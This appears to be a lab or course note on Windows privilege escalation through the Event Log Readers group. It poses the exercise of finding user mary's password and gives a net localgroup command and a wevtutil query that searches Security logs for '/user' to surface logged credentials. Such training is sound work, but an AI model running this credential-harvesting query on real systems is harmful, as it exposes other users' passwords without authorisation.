# [Event Log Readers](Event%20Log%20Readers.md)
### Using the methods demonstrated in this section find the password for the user mary.

```cmd
net localgroup "Event Log Readers"
```
![](Screenshot%202026-08-19%20at%2009.18.25.png)

Using wevtutil to search security logs

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
![](Screenshot%202026-08-19%20at%2009.20.26.png)
